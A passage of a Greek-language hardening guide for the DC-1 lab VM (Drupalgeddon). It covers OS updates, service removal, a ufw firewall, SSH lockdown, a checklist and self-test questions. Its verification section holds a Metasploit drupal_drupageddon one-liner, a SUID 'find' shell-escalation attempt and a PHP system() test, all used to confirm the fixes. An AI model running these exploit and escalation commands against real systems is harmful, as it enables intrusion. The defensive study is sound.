> 💡 Το `noexec` **δεν** εμποδίζει το `sh /tmp/script.sh` ή το `python /tmp/x.py`, γιατί εκεί εκτελείται ο διερμηνέας, όχι το αρχείο. Εμποδίζει όμως μεταγλωττισμένα εκτελέσιμα, όπως τα περισσότερα exploits πυρήνα.

---

## 11. Λειτουργικό σύστημα, υπηρεσίες, firewall, SSH

### 11.1 Ενημέρωση του Debian Wheezy

Το Wheezy (Debian 7) είναι εκτός υποστήριξης από το 2018. Για το εργαστήριο:

```bash
cp /etc/apt/sources.list /etc/apt/sources.list.bak
cat > /etc/apt/sources.list <<'EOF'
deb http://archive.debian.org/debian wheezy main
deb http://archive.debian.org/debian-security wheezy/updates main
EOF
apt-get -o Acquire::Check-Valid-Until=false update
apt-get upgrade
```

Σε παραγωγή, η μόνη ουσιαστική λύση είναι **νέα εγκατάσταση** σε υποστηριζόμενο Debian (12 ή 13) με μεταφορά της εφαρμογής. Ο παλιός πυρήνας του Wheezy έχει γνωστές ευπάθειες τοπικής κλιμάκωσης (π.χ. **Dirty COW, CVE-2016-5195**) που δίνουν root **ακόμη και χωρίς** το SUID `find`.

### 11.2 Απενεργοποίηση περιττών υπηρεσιών

Το `nmap -p-` έδειξε `rpcbind` (111) και μια υψηλή θύρα RPC (`rpc.statd`). Το Wheezy χρησιμοποιεί **SysVinit**:

```bash
service rpcbind stop
service nfs-common stop
update-rc.d rpcbind disable
update-rc.d nfs-common disable
# ή, αν δεν χρειάζονται καθόλου:
apt-get purge rpcbind nfs-common
```

### 11.3 Firewall

```bash
apt-get install ufw
ufw default deny incoming
ufw default allow outgoing     # Ο περιορισμός εξόδου του www-data (§8) εφαρμόζεται επιπλέον
ufw allow 80/tcp
ufw allow from 192.168.56.0/24 to any port 22 proto tcp
ufw enable
```

> ⚠️ Το `ufw` και οι χειροκίνητοι κανόνες `iptables` της §8 μπορεί να συγκρούονται. Σε συστήματα με `ufw`, οι επιπλέον κανόνες εξόδου μπαίνουν στο `/etc/ufw/before.rules`, στην αλυσίδα `ufw-before-output`.

### 11.4 SSH και λογαριασμοί

Το DC-1 έχει έναν χρήστη συστήματος (`flag4`) με αδύναμο κωδικό, που άλλα write-ups σπάνε με `hydra` μέσω SSH. Εφαρμόζουμε τα ίδια μέτρα με το [Raven 1 §7](../02.%20Raven-CTF/Hardening-Guide.md#7-θωράκιση-ssh--πολιτική-κωδικών):

```text
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
AllowUsers <διαχειριστής>
```

```bash
# Λογαριασμοί που δεν χρειάζονται σύνδεση
usermod -s /usr/sbin/nologin flag4
passwd -l flag4
service ssh reload
```

---

## 12. Επαλήθευση

Από το **Kali**:

```bash
# 1. Η έκδοση του Drupal δεν αποκαλύπτεται
curl -I http://<DC1_IP>/CHANGELOG.txt                 # → 403
curl -sI http://<DC1_IP>/ | grep -iE 'server|x-generator|x-powered'

# 2. Μόνο οι αναγκαίες θύρες
nmap -sV -p- <DC1_IP>

# 3. Το exploit αποτυγχάνει
msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set RHOSTS <DC1_IP>; set LHOST <KALI_IP>; run; exit"
```

Αναμενόμενο αποτέλεσμα: `Exploit completed, but no session was created.`

Στο **DC-1**:

```bash
# 4. Το find δεν έχει SUID
ls -l /usr/bin/find
dpkg-statoverride --list /usr/bin/find

# 5. Δοκιμή κλιμάκωσης ως www-data: δεν πρέπει να δώσει root
su -s /bin/sh www-data -c 'find . -exec /bin/sh -p -c id \; -quit'
# → uid=33(www-data) ... ΧΩΡΙΣ euid=0

# 6. Το SUID αγνοείται στο /tmp
cp /bin/sh /tmp/testsh && chmod u+s /tmp/testsh
su -s /bin/sh www-data -c '/tmp/testsh -p -c id'   # → Permission denied (noexec)
rm -f /tmp/testsh

# 7. Ο www-data δεν ανοίγει εξερχόμενες συνδέσεις
su -s /bin/sh www-data -c 'wget -T 3 http://<KALI_IP>:4444/' ; tail -n 3 /var/log/kern.log

# 8. Η PHP δεν εκτελεί εντολές
echo '<?php echo system("id"); ?>' > /var/www/t.php
curl http://localhost/t.php        # → Warning: system() has been disabled for security reasons
rm /var/www/t.php
```

---

## 13. Λίστα ελέγχου & ερωτήσεις αυτοελέγχου

### 13.1 Λίστα ελέγχου

- [ ] Snapshot και αντίγραφα ασφαλείας (αρχεία + βάση)
- [ ] Drupal ≥ 7.32 (ιδανικά τελευταία 7.x) και σχέδιο μετάβασης σε Drupal 10/11
- [ ] Έλεγχος για ίχνη προηγούμενης παραβίασης, `drush cc all`
- [ ] `CHANGELOG.txt` και `install.php` μη προσβάσιμα, banners κρυμμένα
- [ ] `settings.php` σε `440 root:www-data`, νέος κωδικός βάσης, χρήστης βάσης με ελάχιστα δικαιώματα
- [ ] Web root ανήκει στον root, μόνο το `files/` εγγράψιμο, χωρίς εκτέλεση PHP στο `files/`
- [ ] Module PHP filter απενεργοποιημένο, κωδικοί διαχειριστών Drupal αλλαγμένοι
- [ ] `php.ini`: `disable_functions`, `open_basedir`, `allow_url_*` Off, `display_errors` Off
- [ ] Egress filtering για τον `www-data`
- [ ] SUID αφαιρέθηκε από το `find` και κλειδώθηκε με `dpkg-statoverride`
- [ ] Γραμμή βάσης SUID και καθημερινός έλεγχος μέσω cron
- [ ] `/tmp`, `/var/tmp`, `/dev/shm` με `nosuid,nodev,noexec`
- [ ] `rpcbind`/`nfs-common` απενεργοποιημένα, firewall `default deny`, SSH θωρακισμένο
- [ ] Επαλήθευση όλων των βημάτων της §12

### 13.2 Ερωτήσεις αυτοελέγχου

1. Το Drupal 7 χρησιμοποιούσε prepared statements. Γιατί ήταν παρ' όλα αυτά ευάλωτο σε SQL Injection; Τι ακριβώς άλλαξε η `array_values()`;
2. Γιατί το hotfix της §4.1 θεωρείται **προσωρινό** μέτρο;
3. Ποια η διαφορά ανάμεσα σε ένα payload `bind_tcp` και ένα `reverse_tcp`; Ποιο από τα δύο αποτρέπει το egress filtering της §8 και ποιο το `ufw default deny incoming`;
4. Το `passwd` έχει SUID root και το θεωρούμε ασφαλές. Το `find` με SUID root όχι. Ποια είναι η ουσιαστική διαφορά;
5. Τι πρόβλημα λύνει το `dpkg-statoverride` που δεν λύνει ένα απλό `chmod u-s`;
6. Ένας επιτιθέμενος αντιγράφει ένα SUID εκτελέσιμο στο `/tmp`. Ποια επιλογή του `/etc/fstab` εξουδετερώνει το SUID του; Ποια επιλογή εμποδίζει την εκτέλεσή του εντελώς;
7. Γιατί αλλάζουμε τον κωδικό της βάσης δεδομένων **μετά** την αναβάθμιση, αφού η ευπάθεια έχει πλέον διορθωθεί;

---

## Πηγές

- [Drupal Security Advisory SA-CORE-2014-005 (Drupalgeddon)](https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql)
- [NVD — CVE-2014-3704](https://nvd.nist.gov/vuln/detail/CVE-2014-3704)
- [Drupal — Securing file permissions and ownership](https://www.drupal.org/docs/administering-a-drupal-site/security-in-drupal/securing-file-permissions-and-ownership)
- [Drupal 7 End of Life](https://www.drupal.org/about/drupal-7/d7eol)
- [Debian — dpkg-statoverride(1)](https://manpages.debian.org/dpkg-statoverride)
- [Linux — capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
- [PHP — Runtime configuration: disable_functions, open_basedir](https://www.php.net/manual/en/ini.core.php)
